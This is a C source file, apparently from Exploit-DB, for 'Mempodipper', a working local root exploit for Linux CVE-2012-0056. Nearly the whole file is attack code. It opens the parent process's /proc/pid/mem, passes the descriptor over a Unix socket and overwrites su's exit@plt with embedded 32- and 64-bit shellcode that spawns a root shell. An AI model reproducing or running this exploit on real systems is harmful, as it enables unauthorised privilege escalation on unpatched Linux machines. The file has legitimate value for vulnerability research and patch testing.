/*
Exploit code is here: http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
Blog post about it is here: http://blog.zx2c4.com/749
EDB-Note: Updated version can be found here: https://www.exploit-db.com/exploits/35161/

# Exploit Title: Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit
# Date: Jan 21, 2012
# Author: zx2c4
# Tested on: Gentoo, Ubuntu
# Platform: Linux
# Category: Local
# CVE-2012-0056


 * Mempodipper
 * by zx2c4
 *
 * Linux Local Root Exploit
 *
 * Rather than put my write up here, per usual, this time I've put it
 * in a rather lengthy blog post: http://blog.zx2c4.com/749
 *
 * Enjoy.
 *
 * - zx2c4
 * Jan 21, 2012
 *
 * CVE-2012-0056
 */

#define _LARGEFILE64_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

char *socket_path = "/tmp/.sockpuppet";
int send_fd(int fd)
{
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	int n;
	int sock;
	char cms[CMSG_SPACE(sizeof(int))];

	if ((sock = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;

	buf[0] = 0;
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = CMSG_LEN(sizeof(int));

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	memmove(CMSG_DATA(cmsg), &fd, sizeof(int));

	if ((n = sendmsg(sock, &msg, 0)) != iov.iov_len)
		return -1;
	close(sock);
	return 0;
}

int recv_fd()
{
	int listener;
	int sock;
	int n;
	int fd;
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	char cms[CMSG_SPACE(sizeof(int))];

	if ((listener = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	unlink(socket_path);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;
	if (listen(listener, 1) < 0)
		return -1;
	if ((sock = accept(listener, NULL, NULL)) < 0)
		return -1;

	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = sizeof cms;

	if ((n = recvmsg(sock, &msg, 0)) < 0)
		return -1;
	if (n == 0)
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
	close(sock);
	close(listener);
	return fd;
}

int main(int argc, char **argv)
{
	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
		char parent_mem[256];
		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
		printf("[+] Opening parent mem %s in child.\n", parent_mem);
		int fd = open(parent_mem, O_RDWR);
		if (fd < 0) {
			perror("[-] open");
			return 1;
		}
		printf("[+] Sending fd %d to parent.\n", fd);
		send_fd(fd);
		return 0;
	}

	printf("===============================\n");
	printf("=          Mempodipper        =\n");
	printf("=           by zx2c4          =\n");
	printf("=         Jan 21, 2012        =\n");
	printf("===============================\n\n");

	int parent_pid = getpid();
	if (fork()) {
		printf("[+] Waiting for transferred fd in parent.\n");
		int fd = recv_fd();
		printf("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			perror("[-] recv_fd");
			return -1;
		}
		printf("[+] Assigning fd %d to stderr.\n", fd);
		dup2(2, 6);
		dup2(fd, 2);

		unsigned long address;
		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
			address = strtoul(argv[2], NULL, 16);
		else {
			printf("[+] Reading su for exit@plt.\n");
			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
			FILE *command = popen("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
			char result[32];
			result[0] = 0;
			fgets(result, 32, command);
			pclose(command);
			address = strtoul(result, NULL, 16);
			if (address == ULONG_MAX || !address) {
				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
				return 1;
			}
			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
		}
		printf("[+] Calculating su padding.\n");
		FILE *command = popen("su this-user-does-not-exist 2>&1", "r");
		char result[256];
		result[0] = 0;
		fgets(result, 256, command);
		pclose(command);
		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
		unsigned long offset = address - su_padding;
		printf("[+] Seeking to offset 0x%lx.\n", offset);
		lseek64(fd, offset, SEEK_SET);

#if defined(__i386__)
		// See shellcode-32.s in this package for the source.
		char shellcode[] =
			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
			"\x06\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
			"\x80";
#elif defined(__x86_64__)
		// See shellcode-64.s in this package for the source.
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

#else
#error "That platform is not supported."
#endif
		printf("[+] Executing su with shellcode.\n");
		execl("/bin/su", "su", shellcode, NULL);
	} else {
		char pid[32];
		sprintf(pid, "%d", parent_pid);
		printf("[+] Executing child from child fork.\n");
		execl("/proc/self/exe", argv[0], "-c", pid, NULL);
	}
}